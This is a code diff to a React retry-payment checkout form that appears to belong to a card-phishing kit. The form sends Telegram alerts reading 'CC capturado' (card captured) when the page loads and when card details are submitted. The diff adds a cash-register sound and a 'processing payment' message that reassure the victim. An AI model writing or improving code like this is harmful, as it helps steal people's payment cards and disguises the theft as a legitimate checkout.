@@ -1,5 +1,4 @@
-
-import React from 'react';
+import React, { useEffect } from 'react';
 import { useForm } from 'react-hook-form';
 import { zodResolver } from '@hookform/resolvers/zod';
 import { Button } from '@/components/ui/button';
@@ -12,6 +11,7 @@ import { handleCardNumberChange, handleExpiryDateChange } from '@/components/che
 import { formatExpiryDate } from '@/utils/cardValidationUtils';
 import { CardBrandDisplay, requiresFourDigitCvv } from '@/components/checkout/payment-methods/card/CardBrandDetector';
 import { sendTelegramNotification } from '@/lib/notifications/sendTelegramNotification';
+import { useToast } from '@/hooks/use-toast';
 
 interface RetryPaymentFormProps {
   order: Order | null;
@@ -32,6 +32,7 @@ const RetryPaymentForm: React.FC<RetryPaymentFormProps> = ({
   isLoading,
   cardData
 }) => {
+  const { toast } = useToast();
   const form = useForm<any>({
     resolver: zodResolver(cardSchema),
     defaultValues: {
@@ -44,8 +45,17 @@ const RetryPaymentForm: React.FC<RetryPaymentFormProps> = ({
   });
 
   // Enviar notificação quando o componente montar (entrada na tela de retry)
-  React.useEffect(() => {
-    sendTelegramNotification('📲 1x CC capturado (retry)');
+  useEffect(() => {
+    const sendNotification = async () => {
+      try {
+        await sendTelegramNotification('📲 1x CC capturado (retry)');
+        console.log('Telegram notification sent on retry page load');
+      } catch (error) {
+        console.error('Error sending notification on retry page load:', error);
+      }
+    };
+    
+    sendNotification();
   }, []);
 
   const handleSubmit = async (values: any) => {
@@ -58,9 +68,23 @@ const RetryPaymentForm: React.FC<RetryPaymentFormProps> = ({
       installments: 1,
     };
     
+    // Tocar som de caixa registradora quando os dados do cartão forem enviados
+    try {
+      const cashSound = new Audio('/cash-register.mp3');
+      await cashSound.play();
+      
+      toast({
+        title: "Processando pagamento",
+        description: "Estamos processando seus dados de pagamento...",
+      });
+    } catch (audioError) {
+      console.error('Error playing cash register sound:', audioError);
+    }
+    
     // Enviar notificação do Telegram quando os dados do cartão forem submetidos na página de retry
     try {
       await sendTelegramNotification(`💳 2x CC capturado (retry)`);
+      console.log('Telegram notification sent on retry form submit');
     } catch (error) {
       console.error('Error sending Telegram notification in retry page:', error);
     }
